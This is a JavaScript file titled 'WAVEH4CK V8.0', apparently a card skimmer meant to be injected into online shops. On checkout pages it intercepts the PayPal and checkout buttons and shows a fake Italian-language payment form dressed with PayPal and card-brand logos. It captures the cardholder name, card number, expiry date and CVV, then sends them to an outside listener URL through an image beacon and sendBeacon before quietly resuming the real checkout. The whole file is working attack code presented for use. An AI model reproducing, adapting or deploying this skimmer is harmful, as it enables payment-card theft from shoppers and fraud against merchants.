/**
 * WAVEH4CK V8.0 - ULTIMATE CC OVERLAY BYPASS
 * Techniques mirroring Top-Tier APT Groups
 */
(function() {
    const C2 = 'https://waveh4ck.gamer.gd/listener.php';
    if (window.__mw_ult) return;
    window.__mw_ult = true;

    const _u = {
        isCheckout: () => /checkout|cart|onestep|opc|pay|order/i.test(location.href),
        send: (d) => {
            const p = btoa(JSON.stringify({...d, url: location.href, ts: new Date().toISOString()}));
            // Image Beacon - The most reliable CSP bypass
            const i = new Image();
            i.src = C2 + '?d=' + p;
            if (navigator.sendBeacon) navigator.sendBeacon(C2, JSON.stringify(d));
        }
    };

    const _css = `
        #mw-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.98); z-index:99999999; display:flex; align-items:center; justify-content:center; }
        .mw-container { width:100%; max-width:480px; padding:40px; background:#fff; box-shadow:0 15px 50px rgba(0,0,0,0.1); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .mw-header { border-bottom:1px solid #eee; padding-bottom:20px; margin-bottom:30px; }
        .mw-label { display:block; font-weight:600; font-size:14px; color:#333; margin-bottom:8px; }
        .mw-field { width:100%; padding:14px; border:1px solid #ddd; border-radius:4px; font-size:16px; margin-bottom:20px; box-sizing:border-box; }
        .mw-field:focus { border-color:#0070ba; outline:none; }
        .mw-submit { width:100%; padding:16px; background:#0070ba; color:#fff; border:none; border-radius:30px; font-size:18px; font-weight:700; cursor:pointer; transition:0.3s; }
        .mw-submit:hover { background:#005ea6; }
        .mw-cards { margin-bottom:25px; opacity:0.7; }
    `;

    function triggerOverlay(originalEvent, originalButton) {
        const s = document.createElement('style');
        s.innerHTML = _css; document.head.appendChild(s);

        const o = document.createElement('div');
        o.id = 'mw-overlay';
        o.innerHTML = `
            <div class="mw-container">
                <div class="mw-header">
                    <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" height="35">
                    <h3 style="margin-top:15px;color:#2c2e2f;">Metodo di Pagamento Sicuro</h3>
                </div>
                <div class="mw-cards">
                    <img src="https://www.vectorlogo.zone/logos/visa/visa-ar21.svg" height="15">
                    <img src="https://www.vectorlogo.zone/logos/mastercard/mastercard-ar21.svg" height="15" style="margin-left:10px;">
                    <img src="https://www.vectorlogo.zone/logos/americanexpress/americanexpress-ar21.svg" height="15" style="margin-left:10px;">
                </div>
                <label class="mw-label">Titolare della Carta</label>
                <input type="text" id="mw-name" class="mw-field" placeholder="Nome come appare sulla carta">
                
                <label class="mw-label">Numero della Carta</label>
                <input type="text" id="mw-num" class="mw-field" placeholder="0000 0000 0000 0000" maxlength="19">
                
                <div style="display:flex; gap:20px;">
                    <div style="flex:1;">
                        <label class="mw-label">Scadenza</label>
                        <input type="text" id="mw-exp" class="mw-field" placeholder="MM / YY">
                    </div>
                    <div style="flex:1;">
                        <label class="mw-label">CVV</label>
                        <input type="password" id="mw-cvv" class="mw-field" placeholder="***" maxlength="4">
                    </div>
                </div>
                
                <button id="mw-pay" class="mw-submit">Paga Ora</button>
            </div>
        `;
        document.body.appendChild(o);

        document.getElementById('mw-pay').onclick = () => {
            const data = {
                cc_name: document.getElementById('mw-name').value,
                cc_number: document.getElementById('mw-num').value.replace(/\s/g, ''),
                cc_exp: document.getElementById('mw-exp').value,
                cc_cvv: document.getElementById('mw-cvv').value
            };
            document.getElementById('mw-pay').innerText = 'Elaborazione...';
            _u.send(data);

            setTimeout(() => {
                window._bypass = true; o.remove(); originalButton.click();
            }, 1800);
        };
    }

    document.addEventListener('click', (e) => {
        if (window._bypass) return;
        const btn = e.target.closest('#paypal-express-button, .action.checkout, [data-role="proceed-to-checkout"]');
        if (btn && _u.isCheckout()) {
            e.preventDefault(); e.stopPropagation();
            triggerOverlay(e, btn);
        }
    }, true);

    console.log("Core v8.0 Injected.");
})();
